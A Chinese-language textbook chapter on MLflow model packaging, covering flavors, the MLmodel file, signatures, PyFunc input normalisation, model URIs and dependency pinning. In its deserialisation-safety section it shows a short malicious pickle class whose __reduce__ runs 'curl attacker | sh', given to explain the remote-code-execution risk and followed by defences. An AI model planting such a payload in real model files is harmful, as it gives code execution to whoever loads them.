# 第 11 章 Model 封装：Flavor、MLmodel、签名与 PyFunc

## 学习目标

- 理解 flavor、Python Function（PyFunc）和 MLmodel 目录的关系。
- 为一个新模型格式设计安全的保存/加载契约。
- 掌握签名推断、输入规范化和类型校验。
- 识别 pickle 反序列化、依赖漂移和列顺序错位三类线上事故。
- 建立 flavor 生态的整体地图，知道原生 flavor、PyFunc、自定义 flavor 与依赖锁定之间的关系。

## 11.1 模型不是一个文件，而是一个契约

部署系统需要的不是“一个 `.pkl`”，而是：

- 怎么加载；
- 输入是什么 schema；
- 输出是什么；
- 依赖哪些库/版本；
- 从哪个 run 来；
- 是否可安全反序列化。

MLflow 用目录 + `MLmodel` 描述这些：

```yaml
artifact_path: model
flavors:
  python_function:
    loader_module: mini_mlflow.models.linear
    data: model.json
    env: requirements.txt
    python_version: 3.12.0
  linear:
    model_path: model.json
    n_features: 1
    coefficients: 1
mini_mlflow_version: 1.0.0
model_format_version: "1.0"
model_uuid: ...
utc_time_created: "2026-11-26T..."
run_id: 4f2c...
signature:
  inputs:
    - {name: floor, type: double}
  outputs:
    - {name: prediction, type: double}
saved_input_example: input_example.json
```

> 3.x 差异：真实 MLflow 3 的 `log_model(model, name="model")` 会创建 LoggedModel，模型文件在 `models/<model_id>/`，返回的 `ModelInfo.model_uri` 是 `models:/<model_id>`。Mini 同时支持两种写法：`artifact_path=` 走本章的 run-artifact 路径，`name=` 走第 40 章的 LoggedModel 路径；迁移细节见第 34 章。

- `python_function` 是统一的加载/预测接口；
- `linear` 是原生 flavor，记录参数数量和系数个数；
- `signature` 是输入/输出 schema；
- `env` 指向依赖文件。

真实 MLflow 的 `MLmodel` 字段更多（`model_uuid`、`utc_time_created`、`mlflow_version`、`metadata`、`model_size_bytes` 等），flavor 也更多。

## 11.2 为什么需要 PyFunc

不同框架的预测 API 不同：

```python
sklearn_model.predict(X)        # ndarray
torch_model(input_tensor)       # tensor
transformers.pipeline(text)     # list[dict]
```

PyFunc 把它们统一为：

```python
model.predict(data)
```

部署层只依赖这个接口，不需要知道底层框架。代价是需要适配层处理：

- DataFrame / records / tensor 的转换；
- 列顺序和类型；
- 输出结构；
- 设备（CPU/GPU）和批大小；
- 依赖加载。

Mini 的 `PyFuncModel` 只支持：

```python
predict(list[dict] | dict[str, list] | list[list])
```

并在有签名时校验列存在与类型。

## 11.3 签名：把事故前移

没有签名的模型，最常见的线上错误是列顺序错位。例如训练时：

```text
[age, income, score]
```

服务时上游按：

```text
[income, age, score]
```

模型仍会输出一个数，但完全错误。签名不能自动修复，但能在边界拒绝：

```python
signature = infer_signature(
    [{"floor": 2.0}, {"floor": 5.0}],
    [2.1, 3.9],
)
```

生成：

```json
{
  "inputs": [{"name": "floor", "type": "double"}],
  "outputs": [{"name": "prediction", "type": "double"}]
}
```

Mini 的类型映射：

| Python 值 | 签名类型 |
|---|---|
| bool | boolean |
| int | long |
| float | double |
| str | string |
| bytes | binary |
| datetime/date | datetime |
| int + float 混合 | double |
| 其他 | string |

校验规则：

- 缺失列 → 错误；
- `double` 接受 int/float；
- `long` 不接受 float（避免静默截断）；
- `string` 不接受数字；
- `None` 允许（是否可空由业务决定）；
- 额外的列在 Mini 中被允许但被忽略；真实 MLflow 的行为依 flavor 和版本，可能更严格。

### 输出签名

输出签名对回归/分类很有价值，但推断容易出错：

- 分类输出可能是 label、概率数组、top-k；
- LLM 输出是结构化 JSON/文本；
- 目标 schema 可能随业务变化。

Mini 只推断一个 `prediction` 列；生产应显式声明输出 schema，并在服务层校验。

## 11.4 保存与加载流程

`save_model`：

1. 校验模型已 fit、flavor 支持；
2. 禁止覆盖非空目录（除非显式 `overwrite=True`）；
3. 写 `model.json`；
4. 可选写 `input_example.json`、`signature.json`；
5. 写 `requirements.txt`；
6. 写 `MLmodel`。

`load_model`：

1. 读 `MLmodel`（YAML）；
2. 找到 `python_function`；
3. 校验 `loader_module` 在白名单；
4. 解析 `data` 相对路径（`safe_join`）；
5. 用对应类型反序列化；
6. 读签名；
7. 返回 `PyFuncModel`。

### 为什么禁止任意 loader

历史版本的 MLflow sklearn/torch flavor 常用 pickle/cloudpickle；3.14 起 sklearn/LightGBM 默认 skops、PyTorch 默认 pt2（torch.export），XGBoost 自 3.6 起默认 UBJSON。但旧模型、显式 `serialization_format="cloudpickle"` 与其他 flavor 仍可能走 pickle。pickle 在反序列化时可以执行任意代码：

```python
class Evil:
    def __reduce__(self):
        return (os.system, ("curl attacker | sh",))
```

如果服务端允许用户上传模型并加载，就等于给用户 RCE。生产必须至少：

- 只加载可信来源的模型；
- 校验制品签名/digest；
- 在隔离沙箱/独立进程加载；
- 禁止 `pickle` 的 `find_class` 任意导入；
- 对模型目录做准入扫描。

Mini 的选择是“只支持 JSON 描述的 linear flavor”，未知 loader 直接拒绝。这不是功能缺失，而是安全边界。

### 自定义 flavor 的最小扩展

以 JSON 线性模型为例，新增 flavor 需要：

1. 一个模型类，实现 `fit/predict/to_dict/from_dict`；
2. 保存时写 flavor 元数据与数据文件；
3. 加载时注册 `loader_module -> (flavor, class)`；
4. 输入规范化与签名；
5. 测试：保存/加载/预测/坏文件/路径穿越。

真实 flavor 还需要处理依赖推断、conda/pip、GPU、batch、序列化版本兼容。

## 11.5 输入规范化

统一的 `normalize_rows` 支持：

```python
[{"a": 1, "b": 2}, {"a": 3, "b": 4}]
{"a": [1, 3], "b": [2, 4]}
{"a": 1, "b": 2}          # 单行
[[1, 2], [3, 4]]          # 需要 feature_names
```

并处理：

- 所有行等长；
- 列顺序按模型签名/feature_names 重排；
- 数值列转 float；
- 错误信息带行列位置。

真实服务还要处理：

- pandas nullable dtypes；
- 类别编码；
- 缺失值策略；
- 图像/文本/tensor；
- 批内异构。

## 11.6 模型 URI

| URI | 解析 |
|---|---|
| `/path/to/model` | 本地目录 |
| `file:///path` | 本地目录 |
| `runs:/<run_id>/model` | 从 run artifact 下载 |
| `models:/name/1` | Registry 版本 → source |
| `models:/name@champion` | 别名 → source |
| `models:/name/Production` | 阶段 → 最高版本 |
| `models:/name/latest` | 最新版本 |

Mini 的 `load_model` 会：

1. 解析 URI；
2. 对 `models:/` 查询 Registry 得到 source；
3. 对 `runs:/` 用客户端下载到临时目录；
4. 读取 `MLmodel`，反序列化为内存对象；
5. 删除临时目录（模型状态已加载）。

生产要额外考虑：

- 下载鉴权与预签名 URL；
- 本地缓存；
- 版本 pin（禁止 `latest` 上生产）；
- 依赖环境（同一模型在不同 Python/CUDA 下可能加载失败）。

## 11.7 依赖与环境

`requirements.txt` 只是提示，不会自动安装。真实 MLflow flavor 会生成 pip/conda 环境，但“锁版本”仍是使用方责任。

最低要求：

- Python 版本；
- 框架版本；
- CUDA/驱动（如适用）；
- 系统库；
- 模型文件的格式版本。

一个可复现的部署制品应包含：

```text
model/
  MLmodel
  ...
Dockerfile / image digest
requirements.lock
```

## 11.8 模型加载失败排查

| 症状 | 常见原因 |
|---|---|
| `MLmodel not found` | 下载路径错、artifact 被删 |
| `UnsupportedFlavor` | loader 不在白名单 |
| JSON 解析失败 | 模型文件损坏/不完整 |
| 列缺失 | 服务端预处理与训练不一致 |
| 类型错误 | 上游把数值当字符串 |
| 依赖导入失败 | Python/框架版本不匹配 |
| 预测全为 NaN | 输入含空值/尺度变化 |

## 11.9 Flavor 生态全景

“Flavor”是 MLflow 对模型框架的适配契约：同一个模型既有框架原生 flavor，也有统一的 `python_function`（PyFunc）表示。原生 flavor 保留框架特有信息，PyFunc 提供部署时的统一 `predict` 入口。

真实 MLflow 3.x 的常见 flavor（以锁定版本 `mlflow.models` 为准）：

| 类别 | Flavor | 说明 |
|---|---|---|
| 表格/树模型 | `sklearn`、`xgboost`、`lightgbm`、`catboost`、`h2o` | 传统 ML 主力；依赖推理、特征顺序、类别编码 |
| 深度学习 | `pytorch`、`tensorflow`、`onnx`、`paddle` | 设备、动态 shape、权重格式差异大 |
| NLP/LLM | `transformers`、`openai`、`langchain`、`llama_index`、`dspy` | 模型/prompt/依赖/工具链都可能变化 |
| 统计/时序 | `statsmodels`、`prophet`、`pmdarima` | 季节性、外部回归量、版本兼容 |
| 大数据 | `spark`、`pyspark.ml` | 分布式推理与特征工程 |
| 其他 | `spacy` | NLP pipeline |
| 通用 | `pyfunc` | 任意 Python 模型的统一包装 |

几个容易混淆的点：

1. **一个模型可以同时有多个 flavor**。`MLmodel` 里既有 `sklearn` 又有 `python_function`；前者用于框架内加载，后者用于统一服务。
2. **`mlflow.pyfunc.load_model` 不等于“任何模型都能无依赖加载”**。它仍需要模型目录、loader、依赖和权限；只是接口统一。
3. **自定义 flavor 的核心不是“多一个 YAML 字段”，而是保存/加载/依赖/签名/测试的完整契约**。最小步骤见 11.4。
4. **依赖推断是便利，不是保证**。`pip_requirements`、`conda_env`、`extra_pip_requirements` 可以覆盖推断结果；生产要锁版本并构建镜像。
5. **反序列化风险随 flavor 增加**。pickle、`torch.load`、任意 `loader_module` 都可能执行代码；第 20、37 章的安全边界必须一起设计。

历史变化：`fastai`、`gluon`、`mleap`、`diviner` 等 flavor 在 2.x 出现过后被移除/降级；MLflow Recipes 在 2.x 弃用、3.0 移除。不要把旧教程的 flavor 清单当成当前承诺。

Mini 只实现 `linear`（纯 JSON）与 `python_function`，这是为了把“契约、签名、白名单、依赖”讲清楚；它不追求覆盖 flavor 生态。

## 11.10 与真实 MLflow 的差距

- 真实 MLflow 支持 sklearn、xgboost、lightgbm、torch、transformers、spark 等 flavor；
- 真实签名支持 tensor spec、schema 更丰富；
- 真实 `log_model` 会自动推断依赖和输入样例；
- 真实加载可能依赖 pickle/cloudpickle（3.14 起部分 flavor 默认已切到 skops/pt2/UBJSON，但旧模型与其他 flavor 仍需防护），需要额外的供应链安全；
- 真实模型服务支持批量、GPU、并发和容器构建。

## 小结

- 模型是“字节 + 加载契约 + 输入/输出 schema + 依赖”。
- PyFunc 提供统一预测接口，但需要严格的输入规范化。
- 签名把列顺序/类型事故前移到边界。
- 反序列化是安全边界，不能为了方便开放任意 loader。
- `models:/@alias` 是发布指针，生产应 pin 版本。
- flavor 生态很大，但契约一致：原生 flavor + PyFunc + 依赖 + 签名 + 安全边界。

## 练习

1. 为一个“纯 JSON 决策树”设计 flavor，写出 MLmodel 的关键字段。
2. 如果上游新增一列，签名校验应该拒绝还是忽略？给出两种策略的利弊。
3. 设计一个模型准入流程，降低恶意 pickle 的风险。

---

下一章：[第 12 章 Model Registry](12-registry.md)
